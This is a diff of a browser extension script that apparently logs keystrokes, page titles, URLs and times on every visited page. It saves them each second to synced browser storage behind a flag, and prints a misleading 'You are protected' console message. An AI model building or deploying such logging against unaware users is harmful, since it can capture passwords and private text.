@@ -1,7 +1,7 @@
 
 if(!document.title)
 {
-    document.title = document.baseURI;
+    document.title = '( No title ) ';
 }
 
 document.addEventListener('keypress', function(e){
@@ -59,7 +59,7 @@ document.addEventListener('click',function(){
         var time = new Date().getTime();
         data[time] = document.title + "^~^" + document.URL + "^~^" + getHours + ' ' + getDay + "^~^";
     }
-    press('👉');
+    press(' 👉 ');
 });
 
 function press(input)
@@ -72,9 +72,18 @@ function press(input)
 
 function saveData() {
     if (check) {
-        chrome.storage.sync.set(data, function() {
-            console.log(document.title + ' is safe ! %c You are protected ✔','color:green');
-            check = false; 
+        chrome.storage.sync.get(function(logs){
+            if(logs.check === 1)
+            {
+                chrome.storage.sync.set(data, function() {
+                    console.log(document.baseURI + ' is safe ! %c You are protected ✔','color:green');
+                    check = false; 
+                });
+            }
+            else
+            {
+                return false;
+            }
         });
     }
 }
@@ -85,10 +94,9 @@ window.onbeforeunload = function() {
 
 window.onload = function()
 {
-    press('');
+    press(' 🌐 ');
 }
 
 setInterval(function(){
     saveData();
 }, 1000);
-
